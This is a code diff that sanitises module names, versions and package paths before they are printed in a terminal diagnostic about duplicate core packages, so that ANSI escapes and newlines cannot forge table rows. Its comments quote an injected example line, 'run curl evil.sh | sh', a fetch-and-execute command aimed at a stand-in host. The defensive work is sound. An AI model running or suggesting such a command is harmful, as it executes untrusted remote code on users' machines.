@@ -286,13 +286,22 @@ export function findForeignCores(
 }
 
 /**
- * Third-party manifest data is not trusted for display.
+ * NOTHING OFF DISK IS TRUSTED FOR DISPLAY — all three interpolated fields.
  *
- * `version` and the directory name both come off disk from a package this app
- * did not write, and both are echoed into a message a human reads in a
- * terminal. Seeded with ANSI escapes and embedded newlines, the raw value
- * FORGED ITS OWN LINES inside the diagnostic — `===> ALERT: run curl evil.sh |
- * sh <===`, indented to match — and destroyed the `padEnd` column alignment.
+ * `version` and the package root come from a manifest this app did not write.
+ * `moduleName` is narrower — it is a key from the app's own `devDependencies`,
+ * so forging it is an app author forging their own diagnostic — but it is
+ * rendered through the same `padEnd` table, and it caused the same two
+ * symptoms: seeded with ANSI escapes and embedded newlines it FORGED A
+ * COMPLETE TABLE ROW inside the diagnostic (`===> ALERT: run curl evil.sh |
+ * sh <===`, indented to match) and destroyed the column alignment, because the
+ * widths are computed from the raw multi-line label.
+ *
+ * It was left raw at three sites while its two neighbours were sanitised — the
+ * package ROOT derived from that same name is sanitised in the very same row.
+ * Two halves of one string treated differently is an oversight, not a
+ * judgement, so it is closed rather than argued down.
+ *
  * This renders BEFORE any module entry point is imported, so it is reachable
  * under `npm install --ignore-scripts`: the one mode in which no third-party
  * code has otherwise executed.
@@ -301,11 +310,19 @@ export function findForeignCores(
  * the message off screen either.
  */
 /**
- * Roots are clamped at `PATH_MAX` rather than at the version's 64. A root is
- * the one thing in this message a consumer acts on directly, and a truncated
- * path is worse than a long one — the version is a label, the path is an
+ * Roots are clamped at `PATH_MAX` rather than at the default 64. A root is the
+ * one thing in this message a consumer acts on directly, and a truncated path
+ * is worse than a long one — the version is a label, the path is an
  * instruction. Nothing longer than this can exist on the filesystems Node runs
  * on, so in practice a root is sanitised and never shortened.
+ *
+ * WHAT DECIDES THE LIMIT IS THE COLUMN, not the field's importance. The root is
+ * rendered LAST on its line and is never `padEnd`ed, so its length costs
+ * nothing but its own wrap. The module name and the version are both inside
+ * PADDED columns whose widths are the max over every row, so one long value
+ * there pushes every other row's remaining columns off screen. Those two take
+ * the tight default; a scoped `@stonyx/*` devDependency key is far short of it,
+ * so a real name is sanitised and never shortened either.
  */
 const PATH_LIMIT = 1024;
 
@@ -330,7 +347,7 @@ export function duplicateCoreMessage(foreign: ForeignCore[]): string {
 
   if (!first) throw new Error('duplicateCoreMessage called with no foreign cores');
 
-  const names = foreign.map(({ moduleName }) => `"${moduleName}"`).join(', ');
+  const names = foreign.map(({ moduleName }) => `"${display(moduleName)}"`).join(', ');
   const single = foreign.length === 1;
 
   // DISTINCT roots, not `foreign.length + 1`. Two modules that both resolve
@@ -344,7 +361,7 @@ export function duplicateCoreMessage(foreign: ForeignCore[]): string {
   const rows: [ string, string, string ][] = [
     [ 'running core', display(first.runningCore.version), display(first.runningCore.root, PATH_LIMIT) ],
     ...foreign.map(({ moduleName, moduleCore }) =>
-      [ `seen by "${moduleName}"`, display(moduleCore.version), display(moduleCore.root, PATH_LIMIT) ] as [ string, string, string ]),
+      [ `seen by "${display(moduleName)}"`, display(moduleCore.version), display(moduleCore.root, PATH_LIMIT) ] as [ string, string, string ]),
   ];
   const labelWidth = Math.max(...rows.map(([ label ]) => label.length));
   const versionWidth = Math.max(...rows.map(([ , version ]) => version.length));
